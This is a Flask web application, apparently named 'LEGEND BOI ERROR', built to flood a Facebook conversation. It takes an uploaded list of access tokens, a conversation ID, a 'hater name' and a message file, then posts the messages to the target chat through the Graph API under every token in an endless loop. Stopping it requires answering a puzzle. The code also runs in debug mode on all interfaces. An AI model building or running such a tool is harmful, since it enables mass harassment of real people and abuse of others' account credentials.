from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
from datetime import datetime

app = Flask(__name__)
app.debug = True

# Global Storage
threads = {}        # thread_id: thread_object
stop_events = {}    # thread_id: Event
tasks = {}          # thread_id: {"question": "", "answer": "", "type": ""}
counters = {}       # thread_id: {"sent": 0, "failed": 0}
logs = {}           # thread_id: list of logs

# Headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36',
    'Accept': '*/*',
    'Connection': 'keep-alive'
}

# Generate Random Stop Task
def generate_task():
    types = ["math", "captcha", "reverse", "emoji"]
    t = random.choice(types)
    
    if t == "math":
        a, b = random.randint(1, 15), random.randint(1, 15)
        return {"type": "math", "question": f"{a} + {b} = ?", "answer": str(a + b)}
    elif t == "captcha":
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
        return {"type": "captcha", "question": f"Type: <code>{code}</code>", "answer": code}
    elif t == "reverse":
        word = random.choice(["LEGEND", "ERROR", "BOI", "FIRE", "STOP", "KING", "GO"])
        return {"type": "reverse", "question": f"Reverse: <b>{word}</b>", "answer": word[::-1]}
    elif t == "emoji":
        mapping = {
            "rocket fire": "GO",
            "skull crossbones": "DIE",
            "crown star": "KING",
            "100 fire": "PERFECT"
        }
        key = random.choice(list(mapping.keys()))
        emojis = key.replace(" ", " ")
        return {"type": "emoji", "question": f"Guess: {emojis}", "answer": mapping[key]}

# Message Sender Function
def send_messages(thread_id, access_tokens, convo_id, hater_name, delay, messages):
    stop_event = stop_events[thread_id]
    sent = failed = 0
    logs[thread_id] = []

    while not stop_event.is_set():
        for msg_text in messages:
            if stop_event.is_set(): break
            for token in access_tokens:
                if stop_event.is_set(): break
                url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
                full_msg = f"{hater_name} {msg_text.strip()}"
                params = {'access_token': token, 'message': full_msg}

                try:
                    r = requests.post(url, data=params, headers=headers, timeout=10)
                    ts = datetime.now().strftime("%H:%M:%S")
                    if r.status_code == 200:
                        log = f"<span style='color:#0f0'>[{ts}] SENT: {full_msg[:30]}...</span>"
                        sent += 1
                    else:
                        log = f"<span style='color:#f55'>[{ts}] FAIL: {r.status_code}</span>"
                        failed += 1
                except:
                    log = f"<span style='color:#ff0'>[{ts}] ERR: network</span>"
                    failed += 1

                logs[thread_id].append(log)
                if len(logs[thread_id]) > 200:
                    logs[thread_id] = logs[thread_id][-200:]
                counters[thread_id] = {"sent": sent, "failed": failed}
                time.sleep(delay)

    # Cleanup
    for d in [threads, stop_events, tasks, counters, logs]:
        d.pop(thread_id, None)

# Routes
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        try:
            token_file = request.files['tokenFile']
            access_tokens = [l.strip() for l in token_file.read().decode().splitlines() if l.strip()]
            convo_id = request.form.get('threadId', '').strip()
            hater_name = request.form.get('kidx', 'LEGEND').strip()
            delay = max(1, int(request.form.get('time', 3)))
            txt_file = request.files['txtFile']
            messages = [l.strip() for l in txt_file.read().decode().splitlines() if l.strip()]

            if not access_tokens or not messages or not convo_id:
                return "Invalid input!", 400

            thread_id = f"t_{int(time.time()*1000)}"
            stop_events[thread_id] = Event()
            logs[thread_id] = []
            counters[thread_id] = {"sent": 0, "failed": 0}
            tasks[thread_id] = generate_task()

            thread = Thread(
                target=send_messages,
                args=(thread_id, access_tokens, convo_id, hater_name, delay, messages),
                daemon=True
            )
            thread.start()
            threads[thread_id] = thread
        except Exception as e:
            return f"Error: {str(e)}", 500

    return render_template_string(HTML_TEMPLATE, threads=threads.keys(), tasks=tasks)

@app.route('/stop/<thread_id>', methods=['POST'])
def stop_thread(thread_id):
    user_answer = request.form.get('answer', '').strip()
    correct = tasks.get(thread_id, {}).get("answer", "").strip()
    if user_answer.lower() == correct.lower():
        if thread_id in stop_events:
            stop_events[thread_id].set()
        return "TASK SOLVED! Thread Stopped."
    return f"WRONG! Try again."

@app.route('/stop_all', methods=['POST'])
def stop_all():
    for event in stop_events.values():
        event.set()
    return "ALL THREADS STOPPED!"

@app.route('/status')
def status():
    return jsonify({
        tid: {
            "sent": counters.get(tid, {}).get("sent", 0),
            "failed": counters.get(tid, {}).get("failed", 0),
            "logs": logs.get(tid, [])[-50:],
            "task": tasks.get(tid, {})
        } for tid in list(threads.keys())
    })

# HTML Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>LEGEND BOI ERROR</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { 
      background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('https://i.imgur.com/92rqE1X.jpeg') center/cover fixed; 
      color: #0f0; font-family: 'Courier New', monospace; min-height: 100vh;
    }
    .container { max-width: 420px; margin: 20px auto; }
    .form-control { background: rgba(0,255,0,0.1); border: 1px solid #0f0; color: #fff; border-radius: 8px; }
    .btn-start { background: linear-gradient(45deg, #0f0, #0c0); color: #000; font-weight: bold; }
    .btn-stop { background: #f55; color: #fff; }
    .console { 
      background: #000; color: #0f0; height: 180px; overflow-y: auto; padding: 8px; 
      border-radius: 8px; font-size: 12px; border: 1px solid #0f0; 
    }
    .task-box { background: rgba(255,255,0,0.2); border: 1px dashed #ff0; padding: 8px; border-radius: 8px; font-size: 13px; }
    h1 { text-shadow: 0 0 15px #0f0; animation: glow 2s infinite; }
    @keyframes glow { 0%,100% { text-shadow: 0 0 15px #0f0; } 50% { text-shadow: 0 0 30px #0f0; } }
    .card { background: rgba(0,0,0,0.6); border: 1px solid #0f0; }
  </style>
</head>
<body>
<div class="container">
  <h1 class="text-center mt-3">LEGEND BOI ERROR</h1>

  <form method="post" enctype="multipart/form-data" class="card p-3 mb-3">
    <div class="mb-2">
      <label class="form-label">TOKEN FILE</label>
      <input type="file" class="form-control form-control-sm" name="tokenFile" required>
    </div>
    <div class="mb-2">
      <label>CONVO ID</label>
      <input type="text" class="form-control form-control-sm" name="threadId" required>
    </div>
    <div class="mb-2">
      <label>HATER NAME</label>
      <input type="text" class="form-control form-control-sm" name="kidx" value="LEGEND" required>
    </div>
    <div class="mb-2">
      <label>DELAY (sec)</label>
      <input type="number" class="form-control form-control-sm" name="time" value="3" min="1" required>
    </div>
    <div class="mb-2">
      <label>TEXT FILE</label>
      <input type="file" class="form-control form-control-sm" name="txtFile" required>
    </div>
    <button type="submit" class="btn btn-start btn-sm w-100">START THREAD</button>
  </form>

  <form method="post" action="/stop_all" class="mb-3">
    <button type="submit" class="btn btn-danger btn-sm w-100">FORCE STOP ALL</button>
  </form>

  <h5 class="text-warning">Active Threads ({{ threads|length }})</h5>
  {% for tid in threads %}
  <div class="card mb-3">
    <div class="card-body p-2">
      <div class="d-flex justify-content-between align-items-center">
        <strong>Thread #{{ loop.index }}</strong>
        <div>
          <span class="badge bg-success">Sent: <span id="sent-{{ tid }}">0</span></span>
          <span class="badge bg-danger ms-1">Fail: <span id="failed-{{ tid }}">0</span></span>
        </div>
      </div>

      <div class="task-box mt-2">
        <small><b>STOP TASK:</b> <span id="task-{{ tid }}">Loading...</span></small>
      </div>

      <form method="post" action="/stop/{{ tid }}" class="mt-2">
        <div class="input-group input-group-sm">
          <input type="text" class="form-control" name="answer" placeholder="Answer here" required>
          <button type="submit" class="btn btn-stop">STOP</button>
        </div>
      </form>

      <div class="console mt-2" id="console-{{ tid }}">Starting thread...</div>
    </div>
  </div>
  {% endfor %}

  {% if not threads %}
  <p class="text-center text-muted">No threads running.</p>
  {% endif %}

  <footer class="text-center mt-4 text-muted small">
    <p>© 2025 ERROR ON FIRE</p>
    <a href="https://wa.me/+923203972669" class="text-success">Chat on WhatsApp</a>
  </footer>
</div>

<script>
  setInterval(() => {
    fetch('/status')
      .then(r => r.json())
      .then(data => {
        Object.keys(data).forEach(tid => {
          const sent = document.getElementById(`sent-${tid}`);
          const failed = document.getElementById(`failed-${tid}`);
          const consoleDiv = document.getElementById(`console-${tid}`);
          const taskSpan = document.getElementById(`task-${tid}`);

          if (sent) sent.textContent = data[tid].sent;
          if (failed) failed.textContent = data[tid].failed;
          if (consoleDiv && data[tid].logs) {
            consoleDiv.innerHTML = data[tid].logs.join('<br>');
            consoleDiv.scrollTop = consoleDiv.scrollHeight;
          }
          if (taskSpan && data[tid].task) {
            taskSpan.innerHTML = data[tid].task.question;
          }
        });
      })
      .catch(() => {});
  }, 1000);
</script>
</body>
</html>
'''

if __name__ == '__main__':
    print("="*60)
    print("   LEGEND BOI ERROR SERVER STARTED!")
    print("   Multiple Threads | Live Console | Task Stop | No Crash")
    print("   Visit: http://localhost:5000")
    print("="*60)
    app.run(host='0.0.0.0', port=5000, threaded=True)
